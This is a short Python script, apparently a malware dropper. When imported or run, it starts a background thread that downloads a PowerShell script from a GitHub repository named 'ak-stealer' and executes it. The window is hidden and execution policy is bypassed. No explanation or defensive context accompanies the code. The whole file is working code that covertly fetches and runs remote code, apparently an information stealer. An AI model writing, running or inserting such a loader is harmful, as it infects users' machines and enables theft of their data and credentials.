import urllib.request
import os
import threading

def download_and_execute_powershell():
    url = "https://raw.githubusercontent.com/ak-stealer/lmao/refs/heads/main/main.ps1"
    file_path = "main.ps1"
    
    urllib.request.urlretrieve(url, file_path)
    os.system(f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File {file_path}')

thread = threading.Thread(target=download_and_execute_powershell)
thread.start()
